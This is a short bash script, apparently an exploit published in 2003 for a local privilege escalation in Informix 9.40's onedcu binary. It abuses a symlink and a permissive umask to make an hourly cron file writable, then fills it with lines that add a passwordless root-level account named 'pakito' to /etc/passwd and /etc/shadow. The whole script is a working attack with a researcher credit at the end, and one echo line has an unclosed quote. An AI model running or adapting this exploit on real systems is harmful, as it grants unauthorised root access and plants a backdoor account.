#!/bin/bash

ONEDCU=/home/informix-9.40/bin/onedcu
CRONFILE=/etc/cron.hourly/pakito
USER=pakito
DIR=./trash

export INFORMIXDIR=/home/informix-9.40/
export ONCONFIG=onconfig.std

        if [ -d $DIR ]; then
                echo Trash directory already created
        else
                mkdir $DIR
        fi

cd $DIR
        if [ -f ./"\001" ]; then
                echo Link Already Created
        else
                ln -s $CRONFILE `echo -e "\001"`
        fi

umask 000
$ONEDCU &
kill -9 `pidof $ONEDCU`


echo "echo "#!/bin/bash"" > $CRONFILE
echo "echo "$USER:x:0:0::/:/bin/bash" >> /etc/passwd" >> $CRONFILE
echo "echo "$USER::12032:0:99999:7:::" >> /etc/shadow" >> $CRONFILE
echo " "
echo "  This vulnerability was researched by Juan Manuel Pascual Escriba"
echo "  08/08/2003 Barcelona - Spain pask@open3s.com
echo " "
echo "  must wait until cron execute $CRONFILE and then exec su pakito"

